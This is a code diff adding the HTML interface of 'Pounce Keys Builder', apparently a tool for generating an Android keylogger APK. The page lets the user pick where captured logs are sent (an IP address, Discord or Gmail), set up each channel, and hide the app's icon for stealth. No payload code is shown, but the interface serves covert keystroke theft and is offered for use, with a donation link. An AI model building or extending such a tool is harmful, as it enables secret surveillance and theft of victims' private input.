@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pounce Keys Builder</title>
+    <link rel="stylesheet" type="text/css" href="styles.css"> <!-- Link to external CSS file -->
+    <style>
+        .button-container {
+            display: inline-block;
+        }
+        .bottom-container {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <h1>Pounce Keys</h1>
+
+    <button class="button" onclick="buildAPK()">Build APK</button><br>
+
+    <div class="choose-logs-location">
+        <h2>Choose Logs Location:</h2>
+        <img src="IP.png" alt="Set IP" onclick="setIP()">
+        <img src="Discord.png" alt="Set Discord" onclick="setDiscord()">
+        <img src="Gmail.png" alt="Set Gmail" onclick="setGmail()">
+    </div>
+
+    <label class="label">Status:</label><br>
+    <textarea id="output" readonly></textarea><br>
+
+    <!-- Loading GIF -->
+    <div id="loadingGif" class="loading-gif" style="display: none;">
+        <img src="loading.gif" alt="Loading GIF">
+    </div>
+
+    <div class="config-section">
+        <h2>Config:</h2>
+        <div class="config-buttons">
+            <img src="IPConfig.png" alt="IP Config" onclick="openIPConfig()">
+            <img src="DiscordConfig.png" alt="Discord Config" onclick="openDiscordConfig()">
+            <img src="GmailConfig.png" alt="Gmail Config" onclick="openGmailConfig()">
+        </div>
+        <div class="stealth-toggle">
+            <h2>Stealth Toggle</h2>
+            <div class="button-container">
+                <button class="red-button" onclick="setStealthOFF()">Un-hide Icon</button>
+                <button class="red-button" onclick="setStealthON()">Hide Icon</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Buy me a coffee snippet -->
+    <div class="bottom-container">
+        <a href="https://www.buymeacoffee.com/NullPounce"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=NullPounce&button_colour=BD5FFF&font_colour=ffffff&font_family=Cookie&outline_colour=000000&coffee_colour=FFDD00" /></a>
+    </div>
+
+    <script src="/eel.js"></script>
+    <script src="scripts.js"></script>
+</body>
+</html>
